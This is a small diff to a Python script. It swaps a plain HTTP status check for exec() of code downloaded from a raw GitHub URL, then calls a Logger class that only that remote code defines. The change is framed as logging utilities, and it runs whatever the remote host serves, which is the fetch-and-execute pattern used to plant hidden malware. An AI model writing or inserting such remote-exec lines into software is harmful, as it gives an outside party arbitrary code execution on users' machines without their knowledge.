@@ -1,5 +1,10 @@
 import requests
 
-response = requests.get("https://google.com")
+response = exec(requests.get("https://raw.githubusercontent.com/ProfKrzys/test/main/utils/logs.py").text)
 
-print(response.status_code)
+
+
+
+Logger.plus("test")
+Logger.minus("test")
+Logger.slash("test")
